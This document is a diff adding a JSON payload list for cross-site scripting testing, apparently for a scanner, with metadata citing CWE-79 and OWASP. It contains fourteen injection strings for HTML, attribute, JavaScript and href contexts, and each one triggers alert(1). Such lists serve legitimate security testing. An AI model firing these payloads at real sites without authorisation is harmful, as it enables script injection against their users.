@@ -1,0 +1,37 @@
+{
+"meta": {
+"name": "Cross-Site Scripting",
+"category": "XSS",
+"cwe": "CWE-79",
+"wasc": "WASC-8",
+"reference": "https://owasp.org/www-community/attacks/xss/"
+},
+
+"payloads": [
+
+{ "value": "<script>alert(1)</script>", "context": "html" },
+{ "value": "<img src=x onerror=alert(1)>", "context": "html" },
+{ "value": "<svg/onload=alert(1)>", "context": "html" },
+
+{ "value": "\"><script>alert(1)</script>", "context": "attr" },
+{ "value": "'><script>alert(1)</script>", "context": "attr" },
+
+{ "value": "';alert(1)//", "context": "js" },
+{ "value": "\";alert(1)//", "context": "js" },
+
+{ "value": "<body onload=alert(1)>", "context": "html" },
+
+{ "value": "<iframe src=javascript:alert(1)>", "context": "html" },
+
+{ "value": "javascript:alert(1)", "context": "href" },
+
+{ "value": "<details/open/ontoggle=alert(1)>", "context": "html" },
+
+{ "value": "<input autofocus onfocus=alert(1)>", "context": "html" },
+
+{ "value": "<svg><script>alert(1)</script></svg>", "context": "html" },
+
+{ "value": "<math href=\"javascript:alert(1)\">CLICK</math>", "context": "html" }
+
+]
+}
